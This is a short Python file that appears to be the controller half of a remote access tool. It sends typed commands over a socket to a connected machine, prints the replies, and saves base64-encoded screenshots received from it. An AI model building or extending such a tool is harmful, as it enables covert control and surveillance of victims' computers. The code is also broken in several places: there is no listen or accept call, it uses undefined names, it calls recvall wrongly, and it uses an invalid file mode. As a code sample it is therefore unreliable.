from datetime import datetime


import threading
import socket
import base64
import os

class Server:
    def __init__(self, ip:str, port:int):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind((ip, port))
        self.input_thread = threading.Thread(target=self.user_input)
        self.recving_thread = threading.Thread(target=self.recv_data)

        self.input_thread.start()
        self.recving_thread.start()

    def user_input(self):
        while True:
            inp = str(input("# "))
            self.s.sendall(inp)

    def recv_data(self):
        def recvall(self):
            data = b''
            while True:
                part = self.con.recv(BUFFER)
                data += part
                if len(part) < BUFFER:
                    break
            return data

        while True:
            data = recvall().decode("utf-8")
            if "Screenshot:" in data:
                data = data.replace("Screenshot: ", "")
                screenshot_bytes = base64.b64decode(data)
                file_name = datetime.now().strftime("%m/%d/%Y, %H:%M:%S")
                with open(file_name, 'b+') as f:
                    f.write(screenshot_bytes)

            else:
                print(data)
